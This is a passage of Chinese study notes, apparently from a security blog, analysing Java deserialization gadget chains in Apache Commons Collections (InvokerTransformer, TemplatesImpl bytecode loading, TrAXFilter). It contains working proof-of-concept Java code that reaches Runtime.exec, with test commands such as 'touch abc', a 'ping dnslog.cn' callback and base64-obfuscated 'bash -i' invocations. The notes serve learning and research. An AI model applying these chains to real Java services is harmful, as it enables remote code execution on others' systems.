paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>可以看到有两个构造函数，当传入有参构造函数时，其成员<code>iParamTypes</code>和<code>iArgs</code>会被赋值，然后在其<code>transform</code>函数中，会依据成员<code>iParamTypes</code>和<code>iArgs</code>来生成实例化对象。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></div></figure>

<p>那么我们就可以借助该类的<code>transform</code>函数，来生成<code>TrAXFilter</code>类的实例化对象，从而在<code>TrAXFilter</code>的构造函数中，调用到<code>TemplatesImpl.newTransformer()</code>来加载字节码，完成任意函数调用。</p>

        <h1 id="经典链子CCI"   >
          <a href="#经典链子CCI" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子CCI" class="headerlink" title="经典链子CCI"></a>经典链子CCI</h1>
      <p><code>ChainedTransformer-&gt;ConstantTransformer-&gt;InvokerTransformer</code></p>
<p>为了方便，自己命名为<code>CCI</code></p>

        <h2 id="前置知识-2"   >
          <a href="#前置知识-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>可以使用<code>ChainedTransformer.transform()</code>来调用其中该数组中的各种<code>transformer</code>，从而获取<code>Runtime</code>来执行命令。举个简单的例子如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch abc&quot;</span>&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//随便设置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>调用时<code>ChainedTransformer.transfor()</code>满足如下条件即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121441271.png" alt="image-20220802121441271"></p>
<p>进入之后会一直循环调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121635026.png" alt="image-20220802121635026"></p>
<p>直到最后调用到<code>Runtime的exec</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802122031069.png" alt="image-20220802122031069"></p>

        <h2 id="实际使用"   >
          <a href="#实际使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2>
      <p>调用<code>transform</code>数组获取<code>runtime</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;ping dnslog.cn&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中一种触发方式,LazyMap.get()</span></span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"><span class="comment">//调用LazyMap.get方法</span></span><br><span class="line">TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br></pre></td></tr></table></div></figure>

<p>代表如下获取<code>Runtime</code>的链子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801101348788.png" alt="image-20220801101348788"></p>
<p>从<code>LazyMap.get()</code>开始</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>
<p>这里的<code>factory</code>为<code>ChainedTransformer</code>，其<code>transform</code>为一个数组</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802095635405.png" alt="image-20220802095635405"></p>
<p><code>key</code>为<code>123</code>可以随便设置，但是实际调试的时候不知道为什么进不去，应该是<code>p</code>神讲的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100443587.png" alt="image-20220802100443587"></p>
<p>所以导致运行到上述情况时，上层的<code>HashMap</code>中的key已经是一个进程了，所以有值了，导致调试无法进入。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100604384.png" alt="image-20220802100604384"></p>

        <h1 id="经典链子ITN"   >
          <a href="#经典链子ITN" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子ITN" class="headerlink" title="经典链子ITN"></a>经典链子ITN</h1>
      <p><code>InvokerTransformer-&gt;TemplatesImpl.newTransformer</code></p>
<p>同样为了方便自己命名为<code>ITN</code></p>

        <h2 id="前置知识-3"   >
          <a href="#前置知识-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>可使用<code>TemplatesImpl.newTransformer</code>来调用到<code>defineClass</code>加载字节码任意调用，给个简单的例子</p>
<p>多方参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/63/" >利用TemplatesImpl加载字节码 - (yang99.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://maxzed.top/2022/07/13/javadeserializelab%E5%AD%A6%E4%B9%A0%EF%BC%88jdk1-8-0_301%EF%BC%89/" >JavaDeserializeLab学习（jdk1.8.0_301） – maxzed</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,dG91Y2ggYWJj&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;bytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>设置的命令为<code>touch abc</code>。</p>
<p>调试如下，可以看到，满足<code>TemplatesImpl.newTransformer</code>调用时，存在<code>_name</code>，即可调用对应的<code>_bytecodes</code>的字节码。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802113412874.png" alt="image-20220802113412874"></p>

        <h2 id="实际使用-1"   >
          <a href="#实际使用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际使用-1" class="headerlink" title="实际使用"></a>实际使用</h2>
      
        <h3 id="JAVA版本限制"   >
          <a href="#JAVA版本限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA版本限制" class="headerlink" title="JAVA版本限制"></a>JAVA版本限制</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" >BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>也就是<code>Java 8u251</code>以后，<code>JAVA</code>里的<code>ClassLoader</code>被删除，但是官网的<code>JDK</code>里还是有的，所以跑上面的例子代码还是能跑通，但是如果实际环境中可能就不行了，这个不是很懂。</p>
<p>那么如果没有<code>ClassLoader</code>的话，也就不存在下面的加载字节码的方法了，具体原因是<code>newTransformer</code>函数内部会调用到<code>ClassLoader</code>来加载字节码，这个可以参考如下：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/63/" >利用TemplatesImpl加载字节码 - (yang99.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="解析"   >
          <a href="#解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析" class="headerlink" title="解析"></a>解析</h3>
      <p>该链子的使用方法参考我熊哥的博客：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://maxzed.top/2022/07/13/javadeserializelab%E5%AD%A6%E4%B9%A0%EF%BC%88jdk1-8-0_301%EF%BC%89/" >JavaDeserializeLab学习（jdk1.8.0_301） – maxzed</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>加载字节码，直接运行所需命令</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Li90ZXN0LnNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">TemplatesImpl tempIm = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setField(tempIm, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;asd&quot;</span>);</span><br><span class="line">setField(tempIm, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">setField(tempIm, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">InvokerTransformer invTransf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);</span><br><span class="line"><span class="comment">//调用Get方法</span></span><br><span class="line">TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,tempIm);</span><br></pre></td></tr></table></div></figure>

<p>代表如下运行字节码链子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802103631920.png" alt="image-20220802103631920"></p>
<p>也是从<code>LazyMap.get()</code>开始，这里调试时上一层<code>HashMap</code>中就没有<code>key</code>值了，所以可以进去</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105100090.png" alt="image-20220802105100090"></p>
<p>然后进入<code>transform</code>中，可以看到对应的要执行的命令字节码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105822797.png" alt="image-20220802105822797"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]</span><br></pre></td></tr></table></div></figure>

<p>对比一下在没有序列化时的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105946768.png" alt="image-20220802105946768"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]</span><br></pre></td></tr></table></div></figure>

<p>是完全一样的，那么就会调用到<code>newTransform</code>来调用相关字节码</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535" >Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="经典链子CITTN"   >
          <a href="#经典链子CITTN" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子CITTN" class="headerlink" title="经典链子CITTN"></a>经典链子CITTN</h1>
      <p><code>ChainedTransformer-&gt;ConstantTransformer-&gt;InstantiateTransformer-&gt;TrAXFilter-&gt;TemplatesImpl</code></p>
<p>同样为了方便自己命名为<code>CITTN</code></p>

        <h2 id="测试链"   >
          <a href="#测试链" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试链" class="headerlink" title="测试链"></a>测试链</h2>
      <p>即结合之前提到的这几个类，也能想出相关的链子，相关测试如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch bbbb\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        chain.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-1"   >
          <a href="#解析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-1" class="headerlink" title="解析"></a>解析</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110014361.png" alt="image-20220806110014361"></p>
<p>首先自然还是<code>ChainedTransformer</code>中的数组调用<code>transform</code>函数，之后调用<code>ConstantTransformer</code>的<code>transform</code>函数，获取到<code>TrAXFilter</code>类后，再调用<code>InstantiateTransformer</code>的<code>transform</code>函数，其中会生成<code>TrAXFilter</code>的实例化对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806112255293.png" alt="image-20220806112255293"></p>
<p>随后即可进入<code>TrAXFilter</code>的构造函数，传入的<code>this.iArgs</code>即为实例化<code>InstantiateTransformer</code>时传入的<code>Templates</code>对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110523351.png" alt="image-20220806110523351"></p>
<p>然后就调用到利用反射为<code>Templates</code>对象准备的字节码<code>_bytecodes</code>，从而完成任意函数执行。</p>

        <h1 id="一、CC1"   >
          <a href="#一、CC1" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、CC1" class="headerlink" title="一、CC1"></a>一、CC1</h1>
      
        <h2 id="前置知识-4"   >
          <a href="#前置知识-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>主要是动态代理对象的知识</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/118811585445582" >Java安全漫谈 - 11.反序列化篇(5)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="InvocationHandler"   >
          <a href="#InvocationHandler" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h3>
